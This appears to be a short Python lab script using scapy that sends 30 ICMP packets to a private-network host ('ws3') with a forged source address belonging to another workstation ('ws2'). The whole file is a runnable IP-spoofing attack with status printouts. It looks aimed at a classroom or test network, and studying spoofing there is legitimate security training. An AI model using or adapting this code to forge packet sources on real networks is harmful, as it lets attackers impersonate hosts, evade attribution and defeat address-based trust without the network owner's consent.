#!/usr/bin/env python3
import warnings
warnings.filterwarnings("ignore")

from scapy.all import IP, ICMP, Raw, send
import time

TARGET = "10.1.0.3"       # ws3
FAKE_SOURCE = "10.1.0.2"  # ws2

print("[+] IP spoofing attack")
print(f"[+] Sending packets to {TARGET}")
print(f"[+] Fake source IP = {FAKE_SOURCE}")

for i in range(30):
    packet = IP(src=FAKE_SOURCE, dst=TARGET) / ICMP() / Raw(b"scary hacker packet")
    send(packet, verbose=False)
    print(f"[+] Packet {i + 1}/30 sent")
    time.sleep(0.3)

print("[+] Done")